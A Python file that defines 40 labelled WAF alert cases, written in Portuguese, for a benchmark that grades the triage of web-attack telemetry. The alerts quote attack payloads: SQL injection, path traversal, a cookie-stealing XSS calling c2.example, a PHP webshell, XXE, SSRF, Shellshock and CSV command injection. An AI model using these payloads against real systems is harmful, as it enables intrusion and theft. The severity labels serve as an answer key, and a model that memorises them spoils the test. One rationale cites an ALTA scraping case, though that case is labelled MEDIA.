"""Casos de telemetria WAF (ataques a aplicacao web) para o benchmark.

40 alertas: 10 ALTA, 12 MEDIA, 8 BAIXA, 10 FALSO_POSITIVO — 8 ambiguos (20%).
"""

from __future__ import annotations


def casos_waf() -> list:
    from gerar_benchmark import Caso

    casos = [
        # --- ALTA (10) ---
        Caso(
            "WAF", "203.0.113.50", "10.0.1.5", 443, "TCP",
            'POST /api/login HTTP/1.1 | Content-Type: application/json | body: {"user":"admin\' UNION SELECT password FROM users--","pass":"x"}',
            "SQL injection via UNION SELECT em endpoint de autenticacao de API",
            "critical", "ALTA", "T1190", 0,
            "tentativa clara de extracao de credenciais via UNION SELECT contra endpoint de login exposto.",
        ),
        Caso(
            "WAF", "198.51.100.31", "10.0.1.6", 443, "TCP",
            "GET /produto?id=5 AND SLEEP(5)-- HTTP/1.1 (tempo de resposta medido: 5.02s, repetido com SLEEP(10)=10.01s)",
            "Blind SQL injection baseado em tempo confirmado por medicao de latencia",
            "high", "ALTA", "T1190", 0,
            "correlacao direta entre parametro SLEEP e atraso de resposta confirma injecao SQL cega.",
        ),
        Caso(
            "WAF", "192.0.2.60", "10.0.1.7", 443, "TCP",
            "GET /files/download?path=../../../../../../etc/passwd HTTP/1.1 (resposta 200, corpo contem 'root:x:0:0')",
            "Path traversal com leitura confirmada de /etc/passwd",
            "critical", "ALTA", "T1005", 0,
            "resposta 200 com conteudo do arquivo do sistema confirma exploracao bem-sucedida de path traversal.",
        ),
        Caso(
            "WAF", "203.0.113.72", "10.0.1.5", 443, "TCP",
            "POST /contact HTTP/1.1 | body: nome=teste&msg=<img src=x onerror=fetch('//c2.example/?d='+document.cookie)>",
            "XSS refletido com carga de exfiltracao de cookie em formulario publico",
            "high", "ALTA", "T1190", 0,
            "payload de XSS com callback ativo para dominio externo indica tentativa de roubo de sessao.",
        ),
        Caso(
            "WAF", "198.51.100.44", "10.0.1.9", 443, "TCP",
            "POST /convert HTTP/1.1 | body: url=file:///etc/passwd&format=pdf (SSRF via parametro de conversao)",
            "Server-Side Request Forgery lendo arquivo local via esquema file://",
            "high", "ALTA", "T1190", 0,
            "SSRF com esquema file:// permite leitura de arquivos internos do servidor, risco critico.",
        ),
        Caso(
            "WAF", "192.0.2.15", "10.0.1.5", 443, "TCP",
            "PUT /uploads/relatorio.php%00.pdf HTTP/1.1 | Content-Type: application/pdf | corpo inicia com <?php system($_GET['c']); ?>",
            "Upload de webshell PHP via bypass de extensao com null byte",
            "critical", "ALTA", "T1190", 0,
            "tecnica de bypass de extensao com conteudo de webshell PHP confirmado no corpo do upload.",
        ),
        Caso(
            "WAF", "203.0.113.88", "10.0.1.5", 8080, "TCP",
            "POST /graphql HTTP/1.1 | body: {\"query\":\"{__schema{types{name fields{name}}}} mutation{deleteAllUsers}\"}",
            "Introspeccao GraphQL seguida de tentativa de mutation destrutiva",
            "critical", "ALTA", "T1059", 0,
            "combinacao de introspeccao de schema e mutation destrutiva indica exploracao ativa da API GraphQL.",
        ),
        Caso(
            "WAF", "198.51.100.19", "10.0.1.5", 443, "TCP",
            "GET /api/order?id=1' OR SLEEP(3) AND '1'='1 HTTP/1.1 x120 variacoes de payload em 2 minutos (fuzzing automatizado)",
            "Ferramenta de fuzzing testando dezenas de variantes de SQLi em sequencia",
            "high", "ALTA", "T1190", 0,
            "volume e variacao de payloads em curto intervalo sao caracteristicos de sqlmap ou ferramenta similar em ataque ativo.",
        ),
        Caso(
            "WAF", "192.0.2.77", "10.0.1.5", 443, "TCP",
            "POST /reset-password HTTP/1.1 | body: email=vitima@empresa.com&token=<qualquer> (1200 tentativas em 3min, tokens sequenciais)",
            "Bypass de token de reset de senha por forca bruta sequencial",
            "high", "ALTA", "T1110", 0,
            "volume alto de tentativas com tokens sequenciais indica ataque automatizado ao fluxo de reset de senha.",
        ),
        Caso(
            "WAF", "203.0.113.91", "10.0.1.5", 443, "TCP",
            "POST /api/v1/orders HTTP/1.1 | header: X-Forwarded-For: 127.0.0.1 | body contem template injection: {{7*7}} -> resposta 49 no corpo",
            "Server-Side Template Injection confirmada por avaliacao de expressao",
            "critical", "ALTA", "T1190", 0,
            "resposta com resultado avaliado (49) confirma execucao de expressao no motor de template, caminho para RCE.",
        ),
        # --- MEDIA (12) ---
        Caso(
            "WAF", "198.51.100.52", "10.0.1.5", 443, "TCP",
            "GET /search?q=<script>alert(1)</script> HTTP/1.1 (bloqueado pelo WAF, resposta 403)",
            "Tentativa de XSS refletido bloqueada pelo WAF antes de chegar a aplicacao",
            "medium", "MEDIA", "T1190", 0,
            "payload malicioso identificado mas bloqueado na borda, sem confirmacao de impacto na aplicacao.",
        ),
        Caso(
            "WAF", "192.0.2.29", "10.0.1.6", 443, "TCP",
            "GET /product?id=1' HTTP/1.1 (erro SQL generico retornado no corpo, sem extracao confirmada)",
            "Erro de sintaxe SQL exposto ao injetar aspas simples",
            "medium", "MEDIA", "T1190", 0,
            "erro SQL vazado indica vulnerabilidade potencial mas sem confirmacao de exploracao bem-sucedida.",
        ),
        Caso(
            "WAF", "203.0.113.66", "10.0.1.7", 443, "TCP",
            "GET /export?file=relatorio.csv&dir=..%2f..%2fconfig HTTP/1.1 (resposta 404, caminho nao existe)",
            "Tentativa de path traversal com resposta de arquivo nao encontrado",
            "medium", "MEDIA", "T1005", 0,
            "tentativa de traversal sem sucesso confirmado, mas indica varredura ativa por arquivos sensiveis.",
        ),
        Caso(
            "WAF", "198.51.100.73", "10.0.1.5", 443, "TCP",
            "POST /api/webhook HTTP/1.1 | body: {\"callback_url\":\"http://169.254.169.254/latest/meta-data/\"} (bloqueado por regra de IP interno)",
            "Tentativa de SSRF contra endpoint de metadados de nuvem, bloqueada por regra",
            "medium", "MEDIA", "T1190", 0,
            "tentativa clara de SSRF contra metadados de instancia, mas bloqueada antes de qualquer resposta ser retornada.",
        ),
        Caso(
            "WAF", "192.0.2.38", "10.0.1.5", 443, "TCP",
            "Content-Type: application/json | body: {\"data\":\"O:8:\\\"stdClass\\\":0:{}\"} em campo de comentario PHP",
            "Objeto serializado PHP suspeito em campo de entrada de texto livre",
            "medium", "MEDIA", "T1190", 0,
            "objeto serializado detectado em campo inesperado, requer analise para confirmar exploabilidade real.",
        ),
        Caso(
            "WAF", "203.0.113.104", "10.0.1.5", 443, "TCP",
            "GET /api/products HTTP/1.1 x850 requisicoes em 60s do mesmo IP, sem autenticacao",
            "Volume elevado de requisicoes a endpoint publico sem autenticacao",
            "medium", "MEDIA", "T1499", 0,
            "volume alto sugere scraping automatizado ou tentativa de sobrecarga, requer avaliacao de impacto.",
        ),
        Caso(
            "WAF", "198.51.100.81", "10.0.1.9", 443, "TCP",
            "POST /api/upload HTTP/1.1 | filename: relatorio.xlsx.exe | Content-Type declarado: application/vnd.ms-excel (bloqueado por assinatura de arquivo)",
            "Upload com extensao dupla suspeita bloqueado por verificacao de assinatura",
            "medium", "MEDIA", "T1190", 0,
            "tentativa de disfarce de executavel como planilha, bloqueada, mas indica intencao maliciosa a investigar.",
        ),
        Caso(
            "WAF", "192.0.2.85", "10.0.1.5", 443, "TCP",
            "GET /api/v1/report?format=xml HTTP/1.1 | body: <!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hostname\">]><foo>&xxe;</foo>",
            "Tentativa de XXE (XML External Entity) em endpoint que aceita XML",
            "medium", "MEDIA", "T1005", 0,
            "payload XXE valido submetido, mas sem confirmacao na resposta de que a entidade foi resolvida.",
        ),
        Caso(
            "WAF", "203.0.113.117", "10.0.1.5", 443, "TCP",
            "GET /checkout?coupon=SAVE10&coupon=SAVE10&coupon=SAVE10 HTTP/1.1 (aplicado 3x, valor negativo no total)",
            "Manipulacao de parametro de cupom resultando em valor de pedido negativo",
            "medium", "MEDIA", "", 1,
            "nao ha assinatura de ataque tecnico classico (sem SQLi, XSS ou path traversal) que uma regra baseada em padrao detectaria — apenas a analise do valor final do pedido revela o abuso de logica de negocio, com impacto financeiro potencial a investigar.",
        ),
        Caso(
            "WAF", "198.51.100.95", "10.0.1.5", 443, "TCP",
            "Header: User-Agent: () { :; }; echo vulnerable (tentativa de Shellshock em CGI legado)",
            "Tentativa de exploracao de Shellshock via cabecalho User-Agent",
            "medium", "MEDIA", "T1059", 0,
            "assinatura de exploit conhecido testada contra a aplicacao, sem confirmacao de que o servico e vulneravel.",
        ),
        Caso(
            "WAF", "192.0.2.102", "10.0.1.5", 443, "TCP",
            "GET /api/v1/users/me HTTP/1.1 | Authorization: Bearer <token do usuario A> | parametro user_id=9981 (de outro usuario) retornou dados de terceiros",
            "Possivel IDOR: parametro de usuario retornando dados de outra conta",
            "medium", "MEDIA", "T1005", 0,
            "indicio de controle de acesso quebrado (IDOR) requer confirmacao manual do escopo do vazamento.",
        ),
        Caso(
            "WAF", "203.0.113.129", "10.0.1.5", 443, "TCP",
            "POST /api/v2/import HTTP/1.1 | body: csv com formula =cmd|'/c calc'!A1 em campo de planilha exportavel",
            "Tentativa de CSV injection para execucao de comando ao abrir export em Excel",
            "medium", "MEDIA", "T1059", 0,
            "tecnica visa o usuario final que abrir o export, nao o servidor; impacto depende de acao humana subsequente.",
        ),
        # --- BAIXA (8) ---
        Caso(
            "WAF", "198.51.100.60", "10.0.1.5", 443, "TCP",
            "GET /page?name=<b>teste</b> HTTP/1.1 (tag HTML inofensiva, sem script, bloqueada por precaucao)",
            "Marcacao HTML simples em parametro, sem carga executavel",
            "low", "BAIXA", "", 0,
            "tag HTML sem componente ativo (script/evento) representa risco minimo mesmo se refletida.",
        ),
        Caso(
            "WAF", "192.0.2.19", "10.0.1.5", 443, "TCP",
            "GET /api/status?debug=1 HTTP/1.1 (parametro nao documentado, resposta identica ao normal)",
            "Uso de parametro nao documentado sem efeito observavel",
            "low", "BAIXA", "", 0,
            "parametro de debug testado sem qualquer alteracao de comportamento observada na resposta.",
        ),
        Caso(
            "WAF", "203.0.113.145", "10.0.1.5", 443, "TCP",
            "GET /robots.txt HTTP/1.1 | GET /sitemap.xml HTTP/1.1 (2 requisicoes padrao de crawler)",
            "Acesso a arquivos publicos padrao de indexacao",
            "low", "BAIXA", "", 0,
            "requisicoes a robots.txt e sitemap.xml sao comportamento normal de crawlers e bots de busca.",
        ),
        Caso(
            "WAF", "198.51.100.150", "10.0.1.5", 443, "TCP",
            "POST /contact HTTP/1.1 | body: mensagem contem a palavra 'DROP TABLE' dentro de um texto livre sobre um curso de SQL",
            "Palavra-chave SQL presente em texto legitimo de usuario, sem sintaxe de ataque",
            "low", "BAIXA", "", 0,
            "presenca da palavra 'DROP TABLE' em prosa livre sem sintaxe SQL valida e falso alarme de assinatura textual.",
        ),
        Caso(
            "WAF", "192.0.2.160", "10.0.1.5", 443, "TCP",
            "GET /api/v1/ping HTTP/1.1 x3 em 10min, respostas 200 uniformes",
            "Chamadas de verificacao de disponibilidade em baixo volume",
            "low", "BAIXA", "", 0,
            "baixo volume de chamadas a endpoint de ping sem padrao de automacao maliciosa.",
        ),
        Caso(
            "WAF", "203.0.113.170", "10.0.1.5", 443, "TCP",
            "GET /favicon.ico HTTP/1.1 (404, arquivo nao existe no ambiente de homologacao)",
            "Requisicao de recurso estatico inexistente",
            "low", "BAIXA", "", 0,
            "requisicao trivial de recurso estatico sem qualquer indicador de ataque.",
        ),
        Caso(
            "WAF", "198.51.100.180", "10.0.1.5", 443, "TCP",
            "POST /feedback HTTP/1.1 | body: comentario=\"otimo produto!!!\" repetido 5x em 1min pelo mesmo IP",
            "Envio repetitivo de formulario de feedback com conteudo identico",
            "low", "BAIXA", "", 0,
            "repeticao de formulario legitimo sem payload malicioso e provavel erro de clique duplo do usuario.",
        ),
        Caso(
            "WAF", "192.0.2.190", "10.0.1.5", 443, "TCP",
            "GET /api/v1/products?sort=price&order=asc&order=asc HTTP/1.1 (parametro duplicado, resposta correta)",
            "Parametro de query duplicado sem efeito na resposta",
            "low", "BAIXA", "", 0,
            "duplicacao de parametro comum em construcao de URL por frontend, sem impacto observado.",
        ),
        # --- FALSO_POSITIVO (10) ---
        Caso(
            "WAF", "10.0.5.20", "10.0.1.5", 443, "TCP",
            "POST /login body: user=admin' OR '1'='1'-- (payload identico a SQLi real, origem 10.0.5.20, sub-rede autorizada 'pentest-q2-2026' por contrato PT-2026-014)",
            "Payload de SQLi real disparado por equipe de pentest contratada durante janela autorizada",
            "high", "FALSO_POSITIVO", "T1190", 1,
            "o payload e indistinguivel de um ataque real; apenas o contrato de pentest ativo e a sub-rede de origem confirmam que e atividade sancionada — avaliar so o payload levaria a ALTA por engano.",
        ),
        Caso(
            "WAF", "10.0.5.21", "10.0.1.5", 443, "TCP",
            "GET /product?id=1 UNION SELECT null,null,null-- (sqlmap fingerprint no User-Agent), origem 10.0.5.21 mesma sub-rede de pentest",
            "Assinatura de ferramenta sqlmap detectada durante engajamento de pentest autorizado",
            "high", "FALSO_POSITIVO", "T1190", 1,
            "a assinatura confirmada de sqlmap, ferramenta de exploracao real, apontaria diretamente para ALTA; apenas a origem (sub-rede reservada e monitorada da equipe de pentest contratada) resolve a favor de atividade sancionada.",
        ),
        Caso(
            "WAF", "10.0.4.90", "10.0.1.5", 443, "TCP",
            "GET /health HTTP/1.1 a cada 10s | User-Agent: kube-probe/1.28 (liveness probe do orquestrador de containers)",
            "Health check de orquestrador de containers em intervalo regular",
            "low", "FALSO_POSITIVO", "", 0,
            "user-agent kube-probe e trafego interno esperado de sonda de saude do cluster.",
        ),
        Caso(
            "WAF", "10.0.4.91", "10.0.1.5", 443, "TCP",
            "POST /api/v1/webhook HTTP/1.1 | assinatura HMAC valida | origem: IP cadastrado do provedor de pagamento parceiro-pag.example",
            "Callback de webhook de parceiro de pagamentos com assinatura valida",
            "low", "FALSO_POSITIVO", "", 0,
            "assinatura HMAC valida e origem cadastrada confirmam webhook legitimo do parceiro de pagamentos.",
        ),
        Caso(
            "WAF", "10.0.4.31", "10.0.1.5", 443, "TCP",
            "OWASP ZAP active scan executado via pipeline de CI/CD no job 'security-scan-nightly', 320 payloads de teste em 15min",
            "Bateria de payloads de teste disparada pelo scanner de seguranca do pipeline de CI/CD",
            "medium", "FALSO_POSITIVO", "T1190", 1,
            "centenas de payloads de ataque parecem uma campanha real, mas a origem e o job identificado no pipeline confirmam scan de seguranca automatizado e agendado.",
        ),
        Caso(
            "WAF", "10.0.4.32", "10.0.1.5", 443, "TCP",
            "GET /api/v1/catalog?page=1..500 requisicoes sequenciais do IP do proprio time de dados (job de sincronizacao ETL cadastrado)",
            "Job de ETL interno paginando catalogo completo da API",
            "low", "FALSO_POSITIVO", "", 1,
            "500 requisicoes sequenciais a um endpoint sem autenticacao aparente e o mesmo padrao de um caso ALTA de scraping/enumeracao neste benchmark; apenas a origem (IP do time de dados) e o job de ETL cadastrado distinguem esta ocorrencia de um ataque de enumeracao.",
        ),
        Caso(
            "WAF", "10.0.4.33", "10.0.1.5", 443, "TCP",
            "POST /graphql body: {\"query\":\"{__schema{types{name}}}\"}\" origem: ferramenta interna de documentacao de API (Postman collection sync)",
            "Introspeccao GraphQL originada de ferramenta interna de geracao de documentacao",
            "low", "FALSO_POSITIVO", "", 1,
            "introspeccao de schema e a mesma tecnica de reconhecimento usada em ataques reais contra GraphQL (ver caso ALTA de introspeccao seguida de mutation destrutiva); apenas a origem interna e a ferramenta identificada de documentacao afastam a hipotese de ataque.",
        ),
        Caso(
            "WAF", "10.0.4.34", "10.0.1.5", 443, "TCP",
            "GET /api/v1/status?token=<expirado> HTTP/1.1 respondido 401, retry automatico do SDK do cliente mobile a cada 5s por 2 min",
            "Retries automaticos de SDK mobile apos expiracao de token",
            "low", "FALSO_POSITIVO", "", 1,
            "requisicoes repetidas com respostas 401 poderiam ser confundidas com tentativa de forca bruta contra autenticacao; o padrao de retry e o intervalo fixo correspondem ao comportamento documentado do SDK oficial do app mobile, nao a um ataque.",
        ),
        Caso(
            "WAF", "10.0.4.35", "10.0.1.5", 443, "TCP",
            "POST /api/v1/orders body identico enviado 4x pelo mesmo idempotency-key em 2s (retry de rede do proprio frontend)",
            "Reenvio de requisicao com chave de idempotencia identica",
            "low", "FALSO_POSITIVO", "", 0,
            "uso correto de idempotency-key indica retry de rede tratado pela aplicacao, nao replay malicioso.",
        ),
        Caso(
            "WAF", "10.0.4.36", "10.0.1.5", 443, "TCP",
            "Alerta de assinatura 'SQL Keywords in Body' disparado por texto de artigo de blog interno sobre historico de bancos de dados relacionais",
            "Assinatura de palavras-chave SQL disparada por conteudo editorial legitimo",
            "low", "FALSO_POSITIVO", "", 1,
            "o texto contem termos tecnicos de SQL em prosa legitima de um artigo, sem qualquer sintaxe de injecao — assinatura de palavra-chave gera falso alarme neste contexto editorial.",
        ),
    ]
    assert len(casos) == 40, f"WAF deve ter 40 casos, tem {len(casos)}"
    return casos
